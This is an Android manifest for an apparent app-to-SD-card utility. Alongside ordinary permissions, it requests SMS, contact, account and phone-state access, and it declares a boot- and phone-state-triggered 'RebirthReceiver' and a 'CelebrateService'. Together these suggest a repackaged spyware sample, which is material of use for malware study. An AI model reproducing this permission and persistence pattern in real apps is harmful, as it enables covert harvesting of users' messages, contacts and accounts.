<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.move.app2sd">
    <uses-permission android:name="android.permission.GET_PACKAGE_SIZE"/>
    <uses-permission android:name="android.permission.CLEAR_APP_CACHE"/>
    <uses-permission android:name="android.permission.DELETE_CACHE_FILES"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.VIBRATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.GET_ACCOUNTS"/>
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:label="@string/app_name" android:name=".MainTab" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_name" android:name="App2SdActivity"/>
        <activity android:label="@string/menu_settings" android:name="Preferences"/>
        <activity android:configChanges="keyboard|keyboardHidden|orientation" android:name="com.google.ads.AdActivity"/>
        <receiver android:name=".Receiver">
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
                <data android:scheme="package"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_ADDED"/>
                <data android:scheme="package"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_CHANGED"/>
                <data android:scheme="package"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
                <data android:scheme="package"/>
            </intent-filter>
        </receiver>
        <receiver android:name=".strategy.core.RebirthReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.PHONE_STATE"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
        <service android:name="strategy.service.CelebrateService"/>
    </application>
</manifest>